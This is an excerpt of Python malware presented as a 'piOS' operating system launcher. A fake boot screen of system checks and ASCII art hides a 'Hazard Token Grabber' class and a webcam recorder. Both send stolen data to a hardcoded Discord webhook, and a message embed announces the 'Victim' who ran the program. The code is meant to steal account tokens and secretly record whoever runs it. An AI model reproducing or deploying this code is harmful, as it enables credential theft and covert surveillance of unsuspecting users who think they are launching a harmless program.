...
my_message = """version 1.0
Disk check: okay.
Memory check: okay.
VR year check: okay.
Network check: okay. 
Success! Welcome to piOS!

            88   ,ad9888ba,    ad00000ba
            ""  d8"'    '"8b  d8"     "8b
               d8'        '8b Y8,      
            88 88          88 'Y8aaaaa,
8b,dPPYba,  88 88          88   ''''''8b,  
88P'    "8a 88 Y8.        ,0P         '8P
88       d0 88  Y8a.     a0P  Y0a    a0P
88b,    ,a0 88   '"Y0000Y"'    "Y0000p"
88'Ybbdp"'  88
88
88 """
...
os.system("cls")
typewriter(my_message) 

#version 1.0

config = {
    # replace WEBHOOK_HERE with your webhook ↓↓
    'webhook': "https://discord.com/api/webhooks/977110125431107605/_FaNOc5Zg4tPbqjyd4ZevAKZisV66U5VJckfU1DFV4216N2QwntO2WONTHVe4VRtqdZN",
...
class Hazard_Token_Grabber_V2(functions):
    ...
    def finish(self):
        ...
        embed = {
            'username'
            'avatar_url': 'https://github.com/minecraftGman/piOS-Viruse-edition/blob/main/Small_hazard.jpg',
            'embeds': [
                {
                    'author': {
                        'name': f'*{Victim}* Just ran Hazard piOS!',
                        'url': 'https://discord.io/ahfy',
                        'icon_url': 'https://github.com/minecraftGman/piOS-Viruse-edition/blob/main/Small_hazard.jpg'
                    },
                    'color': 16119101,
                    ...
                    'footer': {
                        'text': '🌟・Grabber By minecraftGman#2105 https://discord.io/ahfy'
                    }
                }
            ]
        }
...
class WebcamRecorder():
    def __init__(self):
        self.webhook = "https://discord.com/api/webhooks/977110125431107605/_FaNOc5Zg4tPbqjyd4ZevAKZisV66U5VJckfU1DFV4216N2QwntO2WONTHVe4VRtqdZN"
    ...
    def Recorder(self):
        ...
        res = '720p'
        t_end = time.time() + 100 #change this to the amount of time you want to record
